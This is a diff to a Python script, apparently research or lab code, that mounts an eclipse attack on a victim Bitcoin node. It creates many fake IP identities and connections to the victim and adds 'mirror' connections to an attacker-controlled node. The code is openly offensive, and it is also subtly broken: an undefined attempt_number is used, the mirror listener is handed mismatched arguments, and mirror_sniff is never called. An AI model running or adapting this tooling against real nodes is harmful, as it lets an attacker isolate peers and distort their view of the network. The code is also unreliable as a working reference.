@@ -40,6 +40,7 @@ eclipse_packet_drop_rate = 0
 identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
 identity_address = [] # Keeps the IP and port for each successful connection
 identity_socket = [] # Keeps the socket for each successful connection
+identity_mirror_socket = [] # The mirrored internal connections to Bitcoin Core
 
 # The file where the iptables backup is saved, then restored when the script ends
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
@@ -101,17 +102,27 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	return msg
 
 # Close a connection
-def close_connection(socket, ip, port, interface):
+def close_connection(socket, mirror_socket, ip, port, interface):
 	socket.close()
+	if mirror_socket != None:
+		mirror_socket.close()
 	terminal(f'sudo ifconfig {interface} {ip} down')
 
-	identity_socket.remove(socket)
-	identity_interface.remove(interface)
-	identity_address.remove((ip, port))
+	if socket in identity_socket: identity_socket.remove(socket)
+	else: del socket
+
+	if mirror_socket != None:
+		if mirror_socket in identity_mirror_socket: identity_mirror_socket.remove(mirror_socket)
+		else: del mirror_socket
+
+	if interface in identity_interface: identity_interface.remove(interface)
+	if (ip, port) in identity_address: identity_address.remove((ip, port))
 	print(f'Successfully closed connection to ({ip} : {port})')
 
 # Creates a fake connection to the victim
-def make_fake_connection(src_ip, dst_ip, verbose=True):
+def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
+	if attempt_number == 0: return
+
 	src_port = random.randint(1024, 65535)
 	dst_port = victim_port
 	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
@@ -136,8 +147,6 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	while success == -1:
 		print(f'Setting socket network interface to "{network_interface}"...')
 		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-		time.sleep(1)
-		print(network_interface)
 
 	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
 	s.bind((src_ip, src_port))
@@ -146,8 +155,8 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	try:
 		s.connect((dst_ip, dst_port))
 	except:
-		close_connection(s, src_ip, src_port, interface)
-		make_fake_connection(random_ip(), dst_ip, False)
+		close_connection(s, None, src_ip, src_port, interface)
+		make_fake_connection(random_ip(), dst_ip, False, attempt_number - 1)
 		return
 
 	# Send version packet
@@ -166,11 +175,17 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	identity_address.append((src_ip, src_port))
 	identity_socket.append(s)
 
+
+	mirror_socket = mirror_make_fake_connection(socket, interface, src_ip, verbose)
+	if mirror_socket != None:
+		identity_mirror_socket.append(mirror_socket)
+
 	# Listen to the connections for future packets
 	if verbose: print('Attaching packet listener to {interface}')
 	try:
 		start_new_thread(sniff, (), {
 			'socket': s,
+			'mirror_socket': mirror_socket,
 			'src_ip': src_ip,
 			'src_port': src_port,
 			'dst_ip': dst_ip,
@@ -178,14 +193,32 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 			'interface': interface
 		})
 	except:
-		print('Error: unable to  start thread to sniff interface {interface}')
+		print('Error: unable to start thread to sniff interface {interface}')
+	
+	if mirror_socket != None:
+		if verbose: print('Attaching mirror packet listener to {interface}')
+		try:
+			start_new_thread(sniff, (), {
+				'socket': mirror_socket,
+				'orig_socket': s,
+				'src_ip': src_ip,
+				'src_port': src_port,
+				'dst_ip': dst_ip,
+				'dst_port': dst_port,
+				'interface': interface
+			})
+		except:
+			print('Error: unable to start thread to sniff interface {interface}')
 
-	make_fake_connection_to_bitcoin(socket, interface, src_ip, attacker_ip, 8333, verbose)
 
 # Creates a fake connection to the victim
-def make_fake_connection_to_bitcoin(socket, interface, src_ip, dst_ip, dst_port, verbose=True):
+def mirror_make_fake_connection(socket, interface, src_ip, verbose=True):
+	if attempt_number == 0: return None
+
 	src_port = random.randint(1024, 65535)
-	print(f'Creating Bitcoin identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
+	dst_ip = attacker_ip
+	dst_port = 8333
+	print(f'Creating mirrored identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
 	if verbose: print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -195,8 +228,6 @@ def make_fake_connection_to_bitcoin(socket, interface, src_ip, dst_ip, dst_port,
 	while success == -1:
 		print(f'Setting socket network interface to "{network_interface}"...')
 		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-		time.sleep(1)
-		print(network_interface)
 
 	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
 	s.bind((src_ip, src_port))
@@ -205,9 +236,8 @@ def make_fake_connection_to_bitcoin(socket, interface, src_ip, dst_ip, dst_port,
 	try:
 		s.connect((dst_ip, dst_port))
 	except:
-		close_connection(s, src_ip, src_port, interface)
-		make_fake_connection(random_ip(), dst_ip, False)
-		return
+		print('Failed to connect to our mirrored node')
+		return None
 
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
@@ -220,34 +250,20 @@ def make_fake_connection_to_bitcoin(socket, interface, src_ip, dst_ip, dst_port,
 	# Get verack packet
 	verack = s.recv(1024)
 
-	if verbose: print('Connection successful!')
+	if verbose: print('Mirrored connection successful!')
 
-	identity_address.append((src_ip, src_port))
-	identity_socket.append(s)
+	return s
 
-	# Listen to the connections for future packets
-	if verbose: print('Attaching packet listener to {interface}')
-	try:
-		start_new_thread(sniff, (), {
-			'socket': s,
-			'src_ip': src_ip,
-			'src_port': src_port,
-			'dst_ip': dst_ip,
-			'dst_port': dst_port,
-			'interface': interface
-		})
-	except:
-		print('Error: unable to  start thread to sniff interface {interface}')
 
-def sniff(socket, src_ip, src_port, dst_ip, dst_port, interface):
+def sniff(socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
 		packet = socket.recv(65565)
-		if packet_received(packet, socket, dst_ip, dst_port, src_ip, src_port, interface):
+		if packet_received(packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface):
 			break
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interface):
+def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, to_port, interface):
 	if len(msg_raw) >= 4:
 		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
@@ -275,7 +291,7 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 
 	# Relay Bitcoin packets that aren't from the victim
 	if from_ip == victim_ip:
-		print(f'*** Message received ** addr={to_ip} ** cmd={msg_type}')
+		print(f'*** Message received ** {msg_type} ** {from_ip} --> {to_ip}')
 		try:
 			if msg_type == 'ping':
 				pong = msg_pong(bitcoin_protocolversion)
@@ -283,10 +299,59 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 				socket.send(pong.to_bytes())
 
 		except Exception as e:
-			close_connection(socket, from_ip, from_port, interface)
+			close_connection(socket, mirror_socket, from_ip, from_port, interface)
 			print("Closing socket because of error: " + str(e))
-			make_fake_connection(rand_ip, victim_ip, False) # Use old IP
-			#make_fake_connection(random_ip(), victim_ip, False)
+			make_fake_connection(rand_ip, victim_ip, False, attempt_number - 1) # Use old IP
+			#make_fake_connection(random_ip(), victim_ip, False, attempt_number - 1)
+			return True # End the thread
+	return False
+
+def mirror_sniff(socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
+	while True:
+		packet = socket.recv(65565)
+		if mirror_packet_received(packet, socket, dst_ip, dst_port, src_ip, src_port, interface):
+			break
+
+# Called when a packet is sniffed from the network
+# Return true to end the thread
+def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_ip, to_port, interface):
+	if len(msg_raw) >= 4:
+		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
+	else:
+		is_bitcoin = False
+
+	if is_bitcoin and len(msg_raw) >= 4+12+4+4:
+		msg_type = msg_raw[4 : 4+12].split(b"\x00", 1)[0].decode()
+		payload_length = struct.unpack(b'<i', msg_raw[4+12 : 4+12+4])[0]
+		payload_checksum = hashlib.sha256(hashlib.sha256(msg_raw[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
+		payload_valid = (msg_raw[4+12+4 : 4+12+4+4] == payload_checksum)
+		payload_length_valid = (len(msg_raw) - payload_length == 4+12+4+4)
+		# The payload is msg_raw[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
+	else:	
+		msg_type = ''
+		payload_length = 0
+		payload_valid = False
+		payload_length_valid = False
+
+	if not is_bitcoin: return False
+	if not payload_valid: return False
+	if not payload_length_valid: return False
+
+	# Parse the message payload
+	msg = MsgSerializable.from_bytes(msg_raw)
+
+	# Relay Bitcoin packets that aren't from the victim
+	if from_ip == attacker_ip:
+		print(f'*** Message received ** {msg_type} ** {from_ip} --> {to_ip}')
+		try:
+			if msg_type == 'ping':
+				pong = msg_pong(bitcoin_protocolversion)
+				pong.nonce = msg.nonce
+				socket.send(pong.to_bytes())
+
+		except Exception as e:	
+			print("Closing socket because of error: " + str(e))
+			socket.close()
 			return True # End the thread
 
 	""" Relaying code
@@ -408,7 +473,7 @@ if __name__ == '__main__':
 	# Create the connections
 	for i in range(1, num_identities + 1):
 		try:
-			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
+			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = 3)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
 
